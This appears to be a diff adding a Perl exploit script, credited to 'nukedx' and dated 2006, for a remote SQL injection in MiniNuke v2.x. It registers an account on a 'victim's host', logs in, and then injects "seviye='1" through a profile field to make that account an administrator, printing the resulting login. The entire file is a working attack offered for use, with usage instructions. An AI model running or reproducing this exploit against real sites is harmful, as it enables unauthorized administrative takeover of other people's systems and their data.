@@ -1,0 +1,204 @@
+#!/usr/bin/perl
+#Method found & Exploit scripted by nukedx
+#Contacts > ICQ: 10072 MSN/Main: nukedx@nukedx.com web: www.nukedx.com
+#Original advisory: http://www.nukedx.com/?viewdoc=31
+#Usage: mini.pl <host> <path> <user> <pass> <mail>
+use IO::Socket;
+if(@ARGV != 5) { usage(); }
+else { exploit(); }
+sub header()
+{
+  print "\n- NukedX Security Advisory Nr.2006-31\r\n";
+  print "- MiniNuke v2.x Remote SQL Injection (create an admin) Exploit\r\n";
+}
+sub usage() 
+{
+  header();
+  print "- Usage: $0 <host> <path> <user> <pass> <mail>\r\n";
+  print "- <host> -> Victim's host ex: www.victim.com\r\n";
+  print "- <path> -> Path to MiniNuke ex: /mininuke/\r\n";
+  print "- <user> -> Desired username to create ex: h4x0r\r\n";
+  print "- <pass> -> Password for our username ex: p4ZZw0rd\r\n";
+  print "- <mail> -> Mail for our username ex: hax0r\@s3x0r3d.com\r\n";
+  exit();
+}
+sub exploit () 
+{
+  #Our variables...
+  $mnserver = $ARGV[0];
+  $mnserver =~ s/(http:\/\/)//eg;
+  $mnhost   = "http://".$mnserver;
+  $mndir    = $ARGV[1];
+  $mnuser   = $ARGV[2];
+  $mnpass   = $ARGV[3];
+  $mnmail   = $ARGV[4];
+  $mnport   = "80";
+  #Sending data...
+  header();
+  print "- Trying to connect: $mnserver\r\n";
+  getsession();
+}
+sub getsession ()
+{
+  print "- Getting session for register...\r\n";
+  $mnstar   = "membership.asp?action=new";
+  $mnsreq   = $mnhost.$mndir.$mnstar;
+  $mns = IO::Socket::INET->new(Proto => "tcp", PeerAddr => "$mnserver", PeerPort => "$mnport") || die "- Connection failed...\r\n";
+  print $mns "GET $mnsreq HTTP/1.1\n";
+  print $mns "Accept: */*\n";
+  print $mns "Referer: $mnhost\n";
+  print $mns "Accept-Language: tr\n";
+  print $mns "User-Agent: NukeZilla\n";
+  print $mns "Cache-Control: no-cache\n";
+  print $mns "Host: $mnserver\n";
+  print $mns "Connection: close\n\n";
+  print "- Connected...\r\n";
+  while ($answer = <$mns>) { 
+    if ($answer =~ /Set-Cookie: (.*?) path=\//) { $mncookie = $mncookie.$1; }
+    if ($answer =~ /Güvenlik Kodunuz<\/td><td width=\"50%\"><b>(.*?)<\/b><\/td>/) { $mngvn=$1;doregister(); }
+  }
+  #if you are here...
+  die "- Exploit failed\r\n";
+}
+sub doregister ()
+{
+  close($mns);
+  $mntar    = "membership.asp?action=register";
+  $mnreq    = $mnhost.$mndir.$mntar;
+  print "- Session getting done\r\n";
+  print "- Lets create our user...\r\n";
+  $mndata = "kuladi=".$mnuser;
+  $mndata.= "&password=".$mnpass;
+  $mndata.= "&email=".$mnmail;
+  $mndata.= "&isim=h4x0r";
+  $mndata.= "&g_soru=whooooo";
+  $mndata.= "&g_cevap=h4x0rs";
+  $mndata.= "&icq=1";
+  $mndata.= "&msn=1";
+  $mndata.= "&aim=1";
+  $mndata.= "&sehir=1";
+  $mndata.= "&meslek=1";
+  $mndata.= "&cinsiyet=b";
+  $mndata.= "&yas_1=1";
+  $mndata.= "&yas_2=1";
+  $mndata.= "&yas_3=1920";
+  $mndata.= "&web=http://www.milw0rm.com";
+  $mndata.= "&imza=h4x0r";
+  $mndata.= "&mavatar=IMAGES/avatars/1.gif";
+  $mndata.= "&security_code=".$mngvn;
+  $mndata.= "&mail_goster=on";
+  $mndatalen = length($mndata);
+  $mn =  IO::Socket::INET->new(Proto => "tcp", PeerAddr => "$mnserver", PeerPort => "$mnport") || die "- Connection failed...\r\n";
+  print $mn "POST $mnreq HTTP/1.1\r\n";
+  print $mn "Accept: */*\r\n";
+  print $mn "Referer: $mnhost\r\n";
+  print $mn "Accept-Language: tr\r\n";
+  print $mn "Content-Type: application/x-www-form-urlencoded\r\n";
+  print $mn "Accept-Encoding: gzip, deflate\r\n";
+  print $mn "User-Agent: NukeZilla\r\n";
+  print $mn "Cookie: $mncookie\r\n";
+  print $mn "Host: $mnserver\r\n";
+  print $mn "Content-length: $mndatalen\r\n";
+  print $mn "Connection: Keep-Alive\r\n";
+  print $mn "Cache-Control: no-cache\r\n\r\n";
+  print $mn $mndata;
+  print $mn "\r\n\r\n";
+  while ($answer = <$mn>) { 
+    if ($answer =~ /Tebrikler !!!/) { 
+      print "- Creating user has been done...\r\n"; 
+      print "- Loginning in to user...\r\n";
+      dologin();
+    }
+  }
+  #if you are here...
+  die "- Exploit failed\r\n";
+}
+sub dologin ()
+{
+  close ($mn);
+  $mnltar  = "enter.asp";
+  $mnlreq  = $mnhost.$mndir.$mnltar;
+  $mnldata = "kuladi=".$mnuser;
+  $mnldata.= "&password=".$mnpass;
+  $mnldata.= "&guvenlik=423412";
+  $mnldata.= "&gguvenlik=423412";
+  $mnldatalen = length($mnldata);
+  $mnl =  IO::Socket::INET->new(Proto => "tcp", PeerAddr => "$mnserver", PeerPort => "$mnport") || die "- Connection failed...\r\n";
+  print $mnl "POST $mnlreq HTTP/1.1\r\n";
+  print $mnl "Accept: */*\r\n";
+  print $mnl "Referer: $mnhost\r\n";
+  print $mnl "Accept-Language: tr\r\n";
+  print $mnl "Content-Type: application/x-www-form-urlencoded\r\n";
+  print $mnl "Accept-Encoding: gzip, deflate\r\n";
+  print $mnl "User-Agent: NukeZilla\r\n";
+  print $mnl "Host: $mnserver\r\n";
+  print $mnl "Content-length: $mnldatalen\r\n";
+  print $mnl "Connection: Keep-Alive\r\n";
+  print $mnl "Cache-Control: no-cache\r\n\r\n";
+  print $mnl $mnldata;
+  print $mnl "\r\n\r\n";
+  while ($answer = <$mnl>) { 
+    if ($answer =~ /Set-Cookie: (.*?) path=\//) { $mnlcookie = $mnlcookie.$1; }
+    if ($answer =~ /Cache-control:/) { doadmin(); }
+   }
+  #if you are here...
+  die "- Exploit failed\r\n";
+}
+sub doadmin ()
+{
+  close($mnl);
+  print "- Editing profile..\r\n";
+  $mnptar  = "Your_Account.asp?op=UpdateProfile";
+  $mnpreq  = $mnhost.$mndir.$mnptar;
+  $mnpdata.= "email=".$mnmail;
+  $mnpdata.= "&isim=h4x0r";
+  $mnpdata.= "&g_soru=whooooo";
+  $mnpdata.= "&g_cevap=h4x0rs";
+  $mnpdata.= "&icq=1";
+  $mnpdata.= "&msn=1";
+  $mnpdata.= "&aim=1";
+  $mnpdata.= "&sehir=1";
+  $mnpdata.= "&meslek=1";
+  $mnpdata.= "&cinsiyet=b";
+  $mnpdata.= "&yas_1=1";
+  $mnpdata.= "&yas_2=1";
+  $mnpdata.= "&yas_3=1920',seviye='1";
+  $mnpdata.= "&web=http://www.milw0rm.com";
+  $mnpdata.= "&imza=h4x0r";
+  $mnpdata.= "&mavatar=IMAGES/avatars/1.gif";
+  $mnpdata.= "&mail_goster=on";
+  $mnpdatalen = length($mnpdata);
+  $mnp =  IO::Socket::INET->new(Proto => "tcp", PeerAddr => "$mnserver", PeerPort => "$mnport") || die "- Connection failed...\r\n";
+  print $mnp "POST $mnpreq HTTP/1.1\r\n";
+  print $mnp "Accept: */*\r\n";
+  print $mnp "Referer: $mnhost\r\n";
+  print $mnp "Accept-Language: tr\r\n";
+  print $mnp "Content-Type: application/x-www-form-urlencoded\r\n";
+  print $mnp "Accept-Encoding: gzip, deflate\r\n";
+  print $mnp "User-Agent: NukeZilla\r\n";
+  print $mnp "Cookie: $mnlcookie\r\n";
+  print $mnp "Host: $mnserver\r\n";
+  print $mnp "Content-length: $mnpdatalen\r\n";
+  print $mnp "Connection: Keep-Alive\r\n";
+  print $mnp "Cache-Control: no-cache\r\n\r\n";
+  print $mnp $mnpdata;
+  print $mn "\r\n\r\n";
+  while ($answer = <$mnp>) { 
+    if ($answer =~ /Tebrikler !!!/) { 
+      print "- Editing profile been done...\r\n"; 
+      print "- Exploiting finished succesfully\r\n";
+      print "- Your username $mnuser has been created as admin\r\n";
+      print "- You can login with password $mnpass on $mnlreq\r\n";
+      exit();
+    }
+    if ($answer =~ /Üyeler Açýktýr/) { 
+      print "- Exploit failed\r\n";
+      exit();
+    }
+  }
+  #if you are here...
+  die "- Exploit failed\r\n";
+}
+# nukedx.com [2006-05-27]
+
+# milw0rm.com [2006-05-27]
